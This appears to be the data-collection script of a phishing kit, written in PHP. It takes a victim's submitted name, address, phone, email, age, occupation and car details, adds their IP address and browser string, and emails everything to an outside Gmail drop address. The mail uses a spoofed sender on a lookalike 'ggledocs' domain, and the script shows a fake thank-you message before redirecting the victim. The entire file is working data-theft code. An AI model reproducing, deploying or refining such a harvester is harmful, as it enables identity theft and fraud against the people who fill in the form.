<?
$IP = getenv("REMOTE_ADDR");
$PORT = getenv("REMOTE_ADDR");
$BS =   $_SERVER['HTTP_USER_AGENT'];

$message .= "NAME: ".$_POST['name']."\n";
$message .= "NAME1: ".$_POST['name1']."\n";
$message .= "ADD: ".$_POST['add']."\n";
$message .= "STADD: ".$_POST['stadd']."\n";
$message .= "STADD1: ".$_POST['stadd1']."\n";
$message .= "STATE: ".$_POST['state']."\n";
$message .= "CITY: ".$_POST['city']."\n";
$message .= "COUNT: ".$_POST['count']."\n";
$message .= "PH: ".$_POST['ph']."\n";
$message .= "EMAIL: ".$_POST['email']."\n";
$message .= "AGE: ".$_POST['age']."\n";
$message .= "OCC: ".$_POST['occ']."\n";
$message .= "CAR: ".$_POST['car']."\n";
$message .= "IP: ".$IP."\n";
$message .= "PORT: ".$IP."\n";
$message .= "BS: ".$BS."\n";

$sent ="serverlog19@gmail.com";

$subject = "Blessings| my employee";
$headers = "From: Trump <employee@ggledocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
echo "Mail Sent.<h3>Thank You</h3> " . $name . ", <p>We will contact you via email shortly </p> <h3>Kindly,check your inbox or spam for our next coming mail</h4>.";
header('Location: index.php');
?>

